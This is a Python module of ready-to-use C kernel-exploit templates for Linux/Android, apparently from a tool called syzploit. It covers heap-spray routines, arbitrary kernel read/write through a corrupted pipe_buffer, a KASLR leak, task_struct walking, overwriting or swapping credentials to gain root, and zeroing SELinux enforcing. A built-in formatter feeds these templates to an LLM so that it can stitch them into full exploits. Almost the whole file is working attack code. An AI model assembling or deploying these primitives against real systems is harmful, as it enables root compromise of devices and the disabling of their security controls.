"""
exploit.primitive_library — Pre-built, parameterized C code templates.

Real kernel exploits share many common building blocks (heap spray, pipe
R/W, task traversal, cred overwrite, SELinux bypass).  This library
provides *tested* C code snippets for each primitive, parameterized by
addresses and function pointers, so the LLM can stitch them together
rather than reinventing everything from scratch.

Each template is a standalone C snippet that compiles when its
``params`` are supplied as ``#define``s or variables in scope.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

from ..core.models import Primitive


# ═══════════════════════════════════════════════════════════════════════
# Template text for each primitive
# ═══════════════════════════════════════════════════════════════════════

# ── Heap Spray ────────────────────────────────────────────────────────

_SPRAY_SENDMSG = r"""
/* ── Heap spray via sendmsg cmsg (kmalloc-64 to kmalloc-1024) ──────
 * Sends a message with a control buffer of *spray_size* bytes.
 * The kernel kmalloc's the cmsg data, keeping it alive until the
 * socket call returns.  Use with socketpair + recvmsg on the other end.
 *
 * Params: SPRAY_SIZE, SPRAY_COUNT (as #defines or variables)
 */
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>

static int spray_socks[2];

static int spray_sendmsg_init(void) {
    return socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_socks);
}

static int spray_sendmsg_one(void *payload, size_t payload_size) {
    char dummy = 'A';
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    char *cmsg_buf = calloc(1, CMSG_SPACE(payload_size));
    if (!cmsg_buf) return -1;

    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = CMSG_SPACE(payload_size);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(payload_size);
    if (payload)
        memcpy(CMSG_DATA(cmsg), payload, payload_size);

    int ret = sendmsg(spray_socks[0], &msg, 0);
    free(cmsg_buf);
    return ret;
}
"""

_SPRAY_MSGSND = r"""
/* ── Heap spray via msgsnd / msg_msg (kmalloc-64 to kmalloc-4096) ──
 * msg_msg has a 48-byte header; total allocation = 48 + data_size.
 * Messages stay in the queue until msgrcv, keeping the object alive.
 *
 * Params: MSG_SPRAY_COUNT, MSG_SPRAY_SIZE
 */
#include <sys/msg.h>
#include <string.h>
#include <stdio.h>

struct spray_msg {
    long mtype;
    char mtext[MSG_SPRAY_SIZE];
};

static int spray_msg_qids[MSG_SPRAY_COUNT];

static int spray_msgsnd_init(int count) {
    for (int i = 0; i < count; i++) {
        spray_msg_qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (spray_msg_qids[i] < 0) { perror("msgget"); return -1; }
    }
    return 0;
}

static int spray_msgsnd(int qid, size_t size) {
    struct spray_msg *m = calloc(1, sizeof(long) + size);
    if (!m) return -1;
    m->mtype = 1;
    memset(m->mtext, 'A', size);
    int ret = msgsnd(qid, m, size, 0);
    free(m);
    return ret;
}

static int spray_msgsnd_free(int qid) {
    struct spray_msg m;
    return msgrcv(qid, &m, sizeof(m.mtext), 0, IPC_NOWAIT);
}
"""

_SPRAY_SETXATTR = r"""
/* ── Heap spray via setxattr (any kmalloc size) ───────────────────
 * setxattr allocates + copies user data to kernel, then frees on
 * return.  Use for cross-cache: spray → trigger free → reclaim.
 * The allocation is short-lived (freed on syscall return).
 *
 * Params: XATTR_SPRAY_SIZE
 */
#include <sys/xattr.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>

static int spray_setxattr(const char *path, void *data, size_t size) {
    return setxattr(path, "user.spray", data, size, 0);
}
"""

_SPRAY_ADD_KEY = r"""
/* ── Heap spray via add_key (persistent objects) ──────────────────
 * add_key creates a kernel allocation that stays until keyctl_revoke.
 * Good for long-lived sprays.
 *
 * Params: KEY_SPRAY_SIZE, KEY_SPRAY_COUNT
 */
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

static long spray_keys[KEY_SPRAY_COUNT];

static int spray_add_key(int idx, void *payload, size_t size) {
    char desc[32];
    snprintf(desc, sizeof(desc), "spray%d", idx);
    spray_keys[idx] = syscall(__NR_add_key, "user", desc,
                              payload, size, KEY_SPEC_PROCESS_KEYRING);
    return (spray_keys[idx] < 0) ? -1 : 0;
}

static int spray_revoke_key(int idx) {
    return syscall(__NR_keyctl, KEYCTL_REVOKE, spray_keys[idx]);
}
"""

_SPRAY_PIPE_PAGES = r"""
/* ── Page-level spray via pipe write ──────────────────────────────
 * Write full pages to pipes.  Each write allocates a physical page
 * from the buddy allocator.  Used for cross-cache page reclaiming.
 *
 * Params: PIPE_SPRAY_COUNT
 */
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

static int spray_pipe_fds[PIPE_SPRAY_COUNT][2];

static int spray_pipe_pages_init(int count, const void *page_data) {
    for (int i = 0; i < count; i++) {
        if (pipe(spray_pipe_fds[i]) < 0) return -1;
        if (write(spray_pipe_fds[i][1], page_data, 4096) != 4096)
            return -1;
    }
    return 0;
}

static int spray_pipe_pages_free(int count) {
    for (int i = 0; i < count; i++) {
        close(spray_pipe_fds[i][0]);
        close(spray_pipe_fds[i][1]);
    }
    return 0;
}
"""

# ── Arbitrary R/W Primitives ──────────────────────────────────────────

_PIPE_BUFFER_ARB_RW = r"""
/* ── Arbitrary kernel R/W via corrupted pipe_buffer ───────────────
 * After overlapping a pipe_buffer with an attacker-controlled object,
 * overwrite pipe_buffer.page to point at arbitrary physical memory
 * using vmemmap translation.  Then read/write through the pipe.
 *
 * Requires:
 *   - VMEMMAP_START, LINEAR_MAP_BASE, PAGE_SHIFT defined
 *   - pipe_overlap_read_fd, pipe_overlap_write_fd: the overlapping pipe
 *   - pipe_target_read_fd, pipe_target_write_fd: the target pipe
 *   - saved_pipe_buf_ops: legitimate anon_pipe_buf_ops pointer
 *
 * The caller must establish the pipe overlap first; this code provides
 * the read64 / write64 primitives that use it.
 */
#include <unistd.h>
#include <string.h>
#include <stdio.h>

struct pipe_buffer_fake {
    unsigned long page;
    unsigned int offset;
    unsigned int len;
    unsigned long ops;
    unsigned int flags;
    unsigned long _private;
};

static unsigned long saved_pipe_buf_ops = 0;
static int pipe_overlap_read_fd = -1;
static int pipe_overlap_write_fd = -1;
static int pipe_target_read_fd = -1;
static int pipe_target_write_fd = -1;

static unsigned long phys_to_page(unsigned long phys_addr) {
    return VMEMMAP_START + ((phys_addr >> PAGE_SHIFT) * STRUCT_PAGE_SIZE);
}

/* Build a fake pipe_buffer pointing at the given physical address. */
static void build_fake_pipe_buf(struct pipe_buffer_fake *pbf,
                                unsigned long phys_addr,
                                unsigned int rw_len) {
    memset(pbf, 0, sizeof(*pbf));
    pbf->page = phys_to_page(phys_addr & ~0xfffUL);
    pbf->offset = phys_addr & 0xfff;
    pbf->len = rw_len;
    pbf->ops = saved_pipe_buf_ops;
    pbf->flags = 0;
}

/* Read 8 bytes from a physical address via the pipe primitive. */
static unsigned long read64_phys(unsigned long phys_addr) {
    struct pipe_buffer_fake pbf;
    build_fake_pipe_buf(&pbf, phys_addr, 8);

    /* Write the fake pipe_buffer through the overlap pipe */
    lseek(pipe_overlap_write_fd, 0, SEEK_SET);
    write(pipe_overlap_write_fd, &pbf, sizeof(pbf));

    /* Read through the target pipe — kernel reads from our fake page */
    unsigned long val = 0;
    read(pipe_target_read_fd, &val, sizeof(val));
    return val;
}

/* Write 8 bytes to a physical address via the pipe primitive. */
static void write64_phys(unsigned long phys_addr, unsigned long val) {
    struct pipe_buffer_fake pbf;
    build_fake_pipe_buf(&pbf, phys_addr, 0);  /* len=0 so write appends */

    lseek(pipe_overlap_write_fd, 0, SEEK_SET);
    write(pipe_overlap_write_fd, &pbf, sizeof(pbf));

    write(pipe_target_write_fd, &val, sizeof(val));
}

/*
 * High-level wrappers: convert kernel virtual ↔ physical.
 * Requires KERNEL_BASE (for text/data) and LINEAR_MAP_BASE (for heap).
 */
static unsigned long kaddr_to_phys(unsigned long kaddr) {
    /* Detect if this is a linear-map address or a kernel-text address */
    if ((kaddr & LINEAR_MAP_BASE) == LINEAR_MAP_BASE)
        return kaddr - LINEAR_MAP_BASE;
    /* Kernel text/data: subtract KERNEL_BASE, add physical text base */
    return kaddr - KERNEL_BASE;
}

static unsigned long read64(unsigned long kaddr) {
    return read64_phys(kaddr_to_phys(kaddr));
}

static void write64(unsigned long kaddr, unsigned long val) {
    write64_phys(kaddr_to_phys(kaddr), val);
}
"""

# ── KASLR Bypass ──────────────────────────────────────────────────────

_KASLR_PIPE_OPS_LEAK = r"""
/* ── KASLR bypass via anon_pipe_buf_ops leak ─────────────────────
 * After overlapping a pipe_buffer, read the .ops field to get a pointer
 * to anon_pipe_buf_ops — a known kernel symbol.
 *
 * Params:
 *   ANON_PIPE_BUF_OPS_OFFSET — offset of anon_pipe_buf_ops from _stext
 *   leaked_ops — the value read from pipe_buffer.ops
 *
 * Result: kernel_base = leaked_ops - ANON_PIPE_BUF_OPS_OFFSET
 */
static unsigned long kernel_base = 0;

static int kaslr_bypass_pipe_ops(unsigned long leaked_ops) {
    if (leaked_ops == 0) {
        printf("[-] pipe_buffer.ops is NULL — overlap failed\n");
        return -1;
    }
    kernel_base = leaked_ops - ANON_PIPE_BUF_OPS_OFFSET;
    printf("[+] Leaked anon_pipe_buf_ops = 0x%lx\n", leaked_ops);
    printf("[+] Kernel base = 0x%lx\n", kernel_base);
    return 0;
}
"""

# ── Task Struct Traversal ─────────────────────────────────────────────

_TASK_STRUCT_WALK = r"""
/* ── Walk init_task.tasks linked list and auto-discover offsets ───
 * This is the pattern used by 5 out of 6 real-world Android kernel
 * exploits.  Reads init_task, searches for "swapper/" in the dump to
 * find the comm field, derives cred offset as comm - 0x10.
 *
 * Params (from kernel_offsets.h):
 *   KSYM_INIT_TASK — address of init_task
 *   read64(addr) — must be defined (e.g., from pipe_buffer_arb_rw)
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

struct task_offsets {
    unsigned long comm_off;
    unsigned long cred_off;
    unsigned long tasks_off;
    unsigned long pid_off;
    unsigned long real_parent_off;
};

/* Scan a dumped init_task for known patterns to discover field offsets. */
static int find_task_offsets(unsigned long init_task_addr,
                             struct task_offsets *out) {
    unsigned char buf[0x3000];
    memset(out, 0, sizeof(*out));

    /* Read init_task into userspace buffer */
    for (int i = 0; i < (int)sizeof(buf); i += 8) {
        unsigned long val = read64(init_task_addr + i);
        memcpy(buf + i, &val, 8);
    }

    /* 1) Find comm: look for "swapper/" (init's COMM string) */
    for (int off = 0; off < (int)sizeof(buf) - 16; off += 8) {
        if (memcmp(buf + off, "swapper/", 8) == 0) {
            out->comm_off = off;
            break;
        }
    }
    if (out->comm_off == 0) {
        printf("[-] Could not find comm offset in init_task\n");
        return -1;
    }

    /* 2) cred is 0x10 before comm (consistent across kernel versions) */
    out->cred_off = out->comm_off - 0x10;

    /* 3) Find tasks linked list: two consecutive pointers where
     *    next->prev == &init_task.tasks */
    for (int off = 0x200; off < (int)out->comm_off - 0x100; off += 8) {
        unsigned long next = *(unsigned long *)(buf + off);
        unsigned long prev = *(unsigned long *)(buf + off + 8);

        /* Both should look like kernel pointers */
        if ((next >> 40) == 0 || (prev >> 40) == 0) continue;
        if (next == prev) continue;  /* Can't be self-referencing pair */

        /* Validate: read next->prev and check it points back */
        unsigned long next_prev = read64(next + 8);
        if (next_prev == init_task_addr + off) {
            out->tasks_off = off;
            break;
        }
    }

    /* 4) Find pid: for init, pid == 0 or 1.  Search backwards
     *    from real_parent area for an 8-byte zero (pid=0/tgid=0). */
    for (int off = 0x300; off < (int)out->comm_off - 0x80; off += 4) {
        unsigned int val = *(unsigned int *)(buf + off);
        if (val == 0) {
            /* Check next 4 bytes are also 0 (tgid=0) */
            unsigned int tgid = *(unsigned int *)(buf + off + 4);
            if (tgid == 0) {
                out->pid_off = off;
                break;
            }
        }
    }

    printf("[+] task_struct offsets:\n");
    printf("    comm = 0x%lx\n", out->comm_off);
    printf("    cred = 0x%lx\n", out->cred_off);
    printf("    tasks = 0x%lx\n", out->tasks_off);
    printf("    pid = 0x%lx\n", out->pid_off);
    return 0;
}

/* Find our own task_struct by walking the task list from init_task. */
static unsigned long find_my_task(unsigned long init_task_addr,
                                  struct task_offsets *offsets) {
    pid_t my_pid = getpid();
    unsigned long task = init_task_addr;
    int max_walk = 4096;

    /* Set our comm to something recognizable */
    prctl(PR_SET_NAME, "syzploit", 0, 0, 0);

    for (int i = 0; i < max_walk; i++) {
        unsigned long next_ptr = read64(task + offsets->tasks_off);
        /* Adjust: tasks.next points to the *tasks* field of next task */
        unsigned long next_task = next_ptr - offsets->tasks_off;

        if (next_task == init_task_addr || next_task == 0) break;

        /* Check comm */
        char comm[16] = {0};
        for (int j = 0; j < 16; j += 8) {
            unsigned long v = read64(next_task + offsets->comm_off + j);
            memcpy(comm + j, &v, 8);
        }
        if (memcmp(comm, "syzploit", 8) == 0) {
            printf("[+] Found our task_struct at 0x%lx\n", next_task);
            return next_task;
        }

        task = next_task;
    }
    printf("[-] Could not find our task_struct\n");
    return 0;
}
"""

# ── Privilege Escalation ──────────────────────────────────────────────

_CRED_ZERO = r"""
/* ── Zero all UID/GID fields in struct cred ──────────────────────
 * The simplest privesc: zero uid/gid/euid/egid/suid/sgid/fsuid/fsgid.
 * 8 fields × 4 bytes = 32 bytes starting at cred + 4.
 *
 * Params:
 *   cred_addr — address of the struct cred
 *   write64(addr, val) — must be defined
 */
static int zero_cred_uids(unsigned long cred_addr) {
    printf("[*] Zeroing UIDs at cred 0x%lx\n", cred_addr);
    /* uid(4), gid(4), suid(4), sgid(4), euid(4), egid(4), fsuid(4), fsgid(4)
     * = 8 fields starting at cred + 4 */
    write64(cred_addr + 0x04, 0);  /* uid + gid */
    write64(cred_addr + 0x0c, 0);  /* suid + sgid */
    write64(cred_addr + 0x14, 0);  /* euid + egid */
    write64(cred_addr + 0x1c, 0);  /* fsuid + fsgid */

    /* Verify */
    if (setuid(0) < 0) {
        perror("setuid(0) after cred overwrite");
        return -1;
    }
    if (seteuid(0) < 0) {
        perror("seteuid(0) after cred overwrite");
        return -1;
    }
    printf("[+] UID is now: %d\n", getuid());
    return (getuid() == 0) ? 0 : -1;
}
"""

_CRED_SWAP = r"""
/* ── Swap cred pointer with init's cred (more stable) ────────────
 * Instead of modifying fields, replace our task's cred/real_cred
 * with the cred of init (PID 1).  More stable because we don't
 * corrupt init's cred.
 *
 * Params:
 *   init_task_addr — address of init_task
 *   cred_offset — offset of cred in task_struct
 *   read64/write64 — must be defined
 */
static int swap_cred_with_init(unsigned long my_task_addr,
                                unsigned long init_task_addr,
                                unsigned long cred_offset) {
    /* Read init's cred pointer */
    unsigned long init_cred = read64(init_task_addr + cred_offset);
    printf("[*] init cred at 0x%lx\n", init_cred);

    /* Bump usage count to prevent premature free */
    unsigned int usage = read64(init_cred) & 0xffffffff;
    write64(init_cred, 0x100);

    /* Overwrite our cred and real_cred */
    write64(my_task_addr + cred_offset, init_cred);      /* cred */
    write64(my_task_addr + cred_offset - 8, init_cred);  /* real_cred */

    printf("[+] UID is now: %d\n", getuid());
    return (getuid() == 0) ? 0 : -1;
}
"""

# ── SELinux Bypass ────────────────────────────────────────────────────

_SELINUX_ZERO = r"""
/* ── Disable SELinux by zeroing selinux_state.enforcing ──────────
 * Works on most Android kernels.  The enforcing byte is at offset 0
 * within selinux_state (after the 4-byte initialized field at -4,
 * or offset 12 in newer kernels — check pahole output).
 *
 * Params:
 *   SELINUX_STATE_ADDR — kernel address of selinux_state
 *   write64(addr, val) — must be defined
 */
static void disable_selinux(unsigned long selinux_state_addr) {
    printf("[*] Disabling SELinux at 0x%lx\n", selinux_state_addr);
    /* Zero an 8-byte region covering the enforcing field.
     * This also zeros adjacent bool fields which is fine — they
     * control secondary SELinux features.  */
    write64(selinux_state_addr, 0);
    printf("[+] SELinux enforcing zeroed\n");
}
"""

# ── Utility ───────────────────────────────────────────────────────────

_CPU_PIN = r"""
/* ── Pin current thread/process to a specific CPU ────────────────
 * Critical for slab cache locality — all allocations land in the
 * same per-CPU slab.  Used by 4/6 real-world kernel exploits.
 */
#define _GNU_SOURCE
#include <sched.h>

static int pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}
"""

_PIPE_IPC = r"""
/* ── Pipe-based IPC for multi-process exploit coordination ───────
 * Simple command/ack protocol over pipe pairs.  More reliable than
 * futex or barriers across fork'd processes.
 */
#include <unistd.h>

struct cmd_pipe {
    int fd[2];  /* [0]=read, [1]=write */
};

static int cmd_pipe_init(struct cmd_pipe *p) {
    return pipe(p->fd);
}

static int cmd_pipe_send(struct cmd_pipe *p, int cmd) {
    return write(p->fd[1], &cmd, sizeof(cmd)) == sizeof(cmd) ? 0 : -1;
}

static int cmd_pipe_recv(struct cmd_pipe *p) {
    int cmd = -1;
    if (read(p->fd[0], &cmd, sizeof(cmd)) != sizeof(cmd)) return -1;
    return cmd;
}

static void cmd_pipe_close(struct cmd_pipe *p) {
    close(p->fd[0]);
    close(p->fd[1]);
}
"""


# ═══════════════════════════════════════════════════════════════════════
# Primitive registry with all templates
# ═══════════════════════════════════════════════════════════════════════

def _p(name: str, category: str, desc: str, code: str,
       params: List[str], **kw: Any) -> Primitive:
    """Helper to build a ``Primitive`` with code template."""
    return Primitive(
        name=name,
        category=category,
        description=desc,
        code_template=code,
        requirements={"params": params, **kw.get("reqs", {})},
        provides=kw.get("provides", {}),
    )


BUILTIN_PRIMITIVES: List[Primitive] = [
    # Spray
    _p("heap_spray_sendmsg", "spray",
       "Spray kmalloc-64 to kmalloc-1024 using sendmsg cmsg control data.",
       _SPRAY_SENDMSG, ["SPRAY_SIZE", "SPRAY_COUNT"],
       provides={"caps": ["heap_spray"]}),
    _p("heap_spray_msgsnd", "spray",
       "Spray using msg_msg objects (48-byte header + variable data). "
       "Messages stay allocated until msgrcv frees them.",
       _SPRAY_MSGSND, ["MSG_SPRAY_COUNT", "MSG_SPRAY_SIZE"],
       provides={"caps": ["heap_spray"]}),
    _p("heap_spray_setxattr", "spray",
       "Spray any kmalloc slab using setxattr — short-lived, freed on return.",
       _SPRAY_SETXATTR, ["XATTR_SPRAY_SIZE"],
       provides={"caps": ["heap_spray"]}),
    _p("heap_spray_add_key", "spray",
       "Spray using add_key (persistent objects, freed with keyctl_revoke).",
       _SPRAY_ADD_KEY, ["KEY_SPRAY_SIZE", "KEY_SPRAY_COUNT"],
       provides={"caps": ["heap_spray"]}),
    _p("heap_spray_pipe_pages", "spray",
       "Spray full pages via pipe write for page-level cross-cache reclaim.",
       _SPRAY_PIPE_PAGES, ["PIPE_SPRAY_COUNT"],
       provides={"caps": ["heap_spray", "page_spray"]}),

    # R/W Primitives
    _p("pipe_buffer_arb_rw", "rw_primitive",
       "Arbitrary kernel R/W via corrupted pipe_buffer.page + vmemmap math. "
       "Requires prior pipe_buffer overlap. Provides read64/write64.",
       _PIPE_BUFFER_ARB_RW,
       ["VMEMMAP_START", "LINEAR_MAP_BASE", "KERNEL_BASE",
        "PAGE_SHIFT", "STRUCT_PAGE_SIZE"],
       provides={"caps": ["arb_read", "arb_write", "read64", "write64"]}),

    # KASLR
    _p("kaslr_pipe_ops_leak", "info_leak",
       "KASLR bypass: leak anon_pipe_buf_ops from overlapped pipe_buffer.ops. "
       "Provides kernel_base.",
       _KASLR_PIPE_OPS_LEAK, ["ANON_PIPE_BUF_OPS_OFFSET"],
       provides={"caps": ["kaslr_bypass", "kernel_base"]}),

    # Task struct traversal
    _p("task_struct_walk", "kernel_traversal",
       "Walk init_task.tasks linked list with runtime offset auto-discovery. "
       "Scans init_task dump for 'swapper/' to find comm, derives cred offset. "
       "Used by 5/6 real-world Android kernel exploits.",
       _TASK_STRUCT_WALK, ["KSYM_INIT_TASK", "read64"],
       provides={"caps": ["find_task", "find_cred"]}),

    # Privesc
    _p("cred_uid_zero", "privesc",
       "Zero all UID/GID fields (uid/gid/suid/sgid/euid/egid/fsuid/fsgid) "
       "in struct cred. Simplest privesc technique.",
       _CRED_ZERO, ["cred_addr", "write64"],
       provides={"caps": ["root"]}),
    _p("cred_swap_init", "privesc",
       "Replace process creds with init's cred pointer (more stable than zeroing).",
       _CRED_SWAP,
       ["init_task_addr", "cred_offset", "read64", "write64"],
       provides={"caps": ["root"]}),

    # SELinux
    _p("selinux_enforcing_zero", "selinux",
       "Disable SELinux by zeroing selinux_state.enforcing byte.",
       _SELINUX_ZERO, ["SELINUX_STATE_ADDR", "write64"],
       provides={"caps": ["selinux_bypass"]}),

    # Utility
    _p("cpu_pin", "util",
       "Pin thread/process to specific CPU for slab cache locality.",
       _CPU_PIN, ["cpu_id"],
       provides={"caps": ["cpu_control"]}),
    _p("pipe_ipc", "util",
       "Pipe-based IPC for multi-process exploit coordination.",
       _PIPE_IPC, [],
       provides={"caps": ["ipc"]}),
]


class PrimitiveLibrary:
    """Registry of pre-built exploit primitive templates.

    This replaces the empty ``PrimitiveRegistry`` with a fully
    populated library.  The exploit planner and generator query this
    to get tested C code snippets for each exploitation step.
    """

    def __init__(self) -> None:
        self._primitives: Dict[str, Primitive] = {}
        for p in BUILTIN_PRIMITIVES:
            self._primitives[p.name] = p

    def get(self, name: str) -> Optional[Primitive]:
        return self._primitives.get(name)

    def list_all(self) -> List[Primitive]:
        return list(self._primitives.values())

    def list_by_category(self, category: str) -> List[Primitive]:
        return [p for p in self._primitives.values() if p.category == category]

    def capabilities(self) -> List[str]:
        caps: set[str] = set()
        for p in self._primitives.values():
            pc = p.provides.get("caps", [])
            if isinstance(pc, str):
                pc = [pc]
            caps.update(pc)
        return sorted(caps)

    def get_for_step(self, step_name: str) -> List[Primitive]:
        """Find primitives relevant to a given exploit plan step name.

        Uses keyword matching on the step name against primitive names
        and descriptions.
        """
        _STEP_KEYWORDS: Dict[str, List[str]] = {
            "spray": ["spray", "groom", "heap"],
            "rw_primitive": ["rw", "read", "write", "arb", "primitive"],
            "info_leak": ["kaslr", "leak", "info"],
            "kernel_traversal": ["task", "walk", "traverse", "find"],
            "privesc": ["cred", "uid", "priv", "escalat", "root"],
            "selinux": ["seli", "enforce"],
            "util": ["pin", "cpu", "ipc", "pipe_comm"],
        }
        step_lower = step_name.lower()
        results: List[Primitive] = []
        for cat, keywords in _STEP_KEYWORDS.items():
            if any(kw in step_lower for kw in keywords):
                results.extend(self.list_by_category(cat))
        return results

    def format_for_prompt(self, primitives: Optional[List[Primitive]] = None) -> str:
        """Format primitives for inclusion in an LLM prompt.

        Returns a text block describing available primitives and their
        code templates (truncated to keep prompt size reasonable).
        """
        prims = primitives or self.list_all()
        lines = ["Available exploit primitives (tested C code templates):"]
        for p in prims:
            lines.append(f"\n### {p.name} ({p.category})")
            lines.append(f"  {p.description}")
            params = p.requirements.get("params", [])
            if params:
                lines.append(f"  Parameters: {', '.join(params)}")
            if p.code_template:
                # Include just the first 30 lines of code
                code_lines = p.code_template.strip().split("\n")[:30]
                lines.append("  Code (truncated):")
                for cl in code_lines:
                    lines.append(f"    {cl}")
                if len(p.code_template.strip().split("\n")) > 30:
                    lines.append("    /* ... (see full template) ... */")
        return "\n".join(lines)
